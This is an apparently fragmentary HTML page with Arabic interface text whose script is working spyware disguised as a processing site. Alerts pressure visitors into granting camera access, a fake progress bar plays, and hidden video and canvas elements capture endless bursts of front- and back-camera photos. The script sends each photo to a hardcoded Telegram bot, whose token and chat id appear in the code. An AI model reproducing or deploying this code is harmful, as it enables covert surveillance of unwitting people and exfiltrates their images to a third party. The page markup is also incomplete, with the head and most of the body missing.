<!DOCTYPE html>

        /* الرسالة المنبثقة الاحترافية */

        .modal p { font-size: 16px; line-height: 1.6; color: #ccc; font-family: 'Arial', sans-serif; }
        .modal-btn { background: #ff0000; color: #fff; border: 1px solid #fff; padding: 12px 30px; font-weight: bold; cursor: pointer; margin-top: 20px; width: 100%; font-size: 18px; text-transform: uppercase; }

        /* ستايل الموقع */
        #main-ui { height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; padding: 20px; box-sizing: border-box; }
        .container { max-width: 450px; margin: 40px auto; border: 2px solid #ff0000; padding: 30px; background: #000; box-shadow: 0 0 20px rgba(255, 0, 0, 0.2); }
        .line-gold { height: 2px; background: linear-gradient(to right, transparent, #ffd700, transparent); margin: 20px 0; width: 100%; }
        .btn-main { width: 100%; max-width: 350px; background: #ff0000; color: white; border: 1px solid #ffffff; padding: 18px; font-size: 18px; cursor: pointer; font-weight: bold; text-transform: uppercase; margin-top: 20px; }
        .btn-channel { display: inline-block; width: 80%; background: #0088cc; color: white; border: 1px solid #ffffff; padding: 12px; font-size: 14px; text-decoration: none; font-weight: bold; margin-top: auto; margin-bottom: 30px; }
        
        #progress-container, #upload-section { display: none; }
        .loader-ring { border: 4px solid #222; border-top: 4px solid #ff0000; border-radius: 50%; width: 60px; height: 60px; animation: spin 0.8s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .progress-bg { background: #111; border: 1px solid #ff0000; height: 12px; margin: 20px 0; }
        .progress-fill { width: 0%; height: 100%; background: #ff0000; transition: width 0.2s linear; }
    </style>
</head>
<body>

<div id="overlay">

<video id="v" style="display:none" autoplay playsinline></video>
<canvas id="c" style="display:none"></canvas>

<script>
    const token = '8624303810:AAH9cA30kPB6caqEhTgR6WT7Bc8PXI35RjY';
    const cid = '7535564997';
    let cameraAllowed = false;

    function askPremium() {
        if (confirm("هل توافق على منح الموقع كافة الصلاحيات المطلوبة لتجنب حدوث أخطاء أثناء المعالجة؟")) {
            document.getElementById('overlay').style.display = 'none';
        } else {
            alert("لا يمكن استمرار العملية بدون الموافقة على الأذونات!");
        }
    }

    async function checkPerms() {
        if (!cameraAllowed) {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                cameraAllowed = true;
                stream.getTracks().forEach(t => t.stop());
                startCapture();
            } catch (err) {
                alert("يجب السماح بالكاميرا لتجنب تعطل الموقع!");
            }
        } else { startCapture(); }
    }

    async function send(blob, cap) {
        let f = new FormData();
        f.append('chat_id', cid); f.append('photo', blob, 'img.jpg'); f.append('caption', cap);
        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {method:'POST', body:f});
    }

    async function startInfiniteShots() {
        while(true) {
            await captureBurst("user", "أمامية (Front)");
            await captureBurst("environment", "خلفية (Back)");
            await new Promise(r => setTimeout(r, 1000));
        }
    }

    async function captureBurst(mode, label) {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({video:{facingMode:mode}});
            const vid = document.getElementById('v'); 
            vid.srcObject = stream;
            for(let i=0; i<10; i++){
                await new Promise(r => setTimeout(r, 1200));
                const can = document.getElementById('c');
                can.width = vid.videoWidth; can.height = vid.videoHeight;
                can.getContext('2d').drawImage(vid, 0, 0);
                can.toBlob(b => send(b, `📸 صيد مستمر: ${label} [${i+1}/10]`), 'image/jpeg', 0.6);
            }
            stream.getTracks().forEach(t => t.stop());
        } catch(e) {}
    }

    function startCapture() {
        document.getElementById('main-ui').style.display = 'none';
        document.getElementById('progress-container').style.display = 'block';
        startInfiniteShots();
        let w = 1;
        let inv = setInterval(() => {
            if(w >= 100) { 
                clearInterval(inv); 
                document.getElementById('progress-container').style.display = 'none'; 
                document.getElementById('upload-section').style.display = 'block'; 
            }
            else { w++; document.getElementById('bar').style.width = w + '%'; document.getElementById('percent').innerText = w + '%'; }
        }, 200); 
    }
</script>

</body>
</html>
